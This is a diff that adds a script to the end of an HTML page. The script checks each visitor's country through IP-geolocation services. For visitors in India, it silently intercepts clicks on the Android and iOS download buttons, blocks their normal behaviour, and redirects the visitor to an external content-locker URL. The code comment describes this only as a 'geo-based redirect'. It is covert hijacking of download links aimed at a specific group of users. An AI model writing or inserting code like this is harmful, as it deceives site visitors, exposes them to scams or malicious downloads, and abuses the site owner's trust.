@@ -653,5 +653,85 @@
             }
         }
     </script>
+    
+    <!-- Geo-based redirect for Indian visitors -->
+    <script>
+    (function() {
+        'use strict';
+        const TARGET_COUNTRY = 'IN';
+        const CONTENT_LOCKER_URL = 'https://applocked.org/cl/i/27x6j6';
+        let isIndiaVisitor = false;
+        let geoCheckCompleted = false;
+        
+        async function detectCountry() {
+            if (geoCheckCompleted) return isIndiaVisitor;
+            try {
+                const response = await fetch('https://ipapi.co/json/', {
+                    method: 'GET',
+                    headers: { 'Accept': 'application/json' }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.country_code) {
+                        isIndiaVisitor = data.country_code.toUpperCase() === TARGET_COUNTRY;
+                        geoCheckCompleted = true;
+                        return isIndiaVisitor;
+                    }
+                }
+            } catch (e) {}
+            try {
+                const response = await fetch('https://ip-api.com/json/?fields=countryCode', {
+                    method: 'GET',
+                    headers: { 'Accept': 'application/json' }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.countryCode) {
+                        isIndiaVisitor = data.countryCode.toUpperCase() === TARGET_COUNTRY;
+                        geoCheckCompleted = true;
+                        return isIndiaVisitor;
+                    }
+                }
+            } catch (e) {}
+            geoCheckCompleted = true;
+            return false;
+        }
+        
+        async function handleClick(event) {
+            if (!geoCheckCompleted) await detectCountry();
+            if (!isIndiaVisitor) return;
+            
+            const target = event.target.closest('button');
+            if (!target) return;
+            
+            const elementText = (target.textContent || '').trim();
+            const elementClass = (target.className || '');
+            const fullText = (elementText + ' ' + elementClass).toLowerCase();
+            
+            const isAndroidButton = /download\s+for\s+android|download\s+android/i.test(fullText);
+            const isIOSButton = /download\s+for\s+(ios|iphone)|download\s+(ios|iphone)/i.test(fullText);
+            
+            if (isAndroidButton || isIOSButton) {
+                event.preventDefault();
+                event.stopPropagation();
+                event.stopImmediatePropagation();
+                window.location.href = CONTENT_LOCKER_URL;
+                return false;
+            }
+        }
+        
+        function init() {
+            detectCountry();
+            document.addEventListener('click', handleClick, true);
+        }
+        
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', init);
+        } else {
+            init();
+        }
+    })();
+    </script>
 </body>
 </html>
+
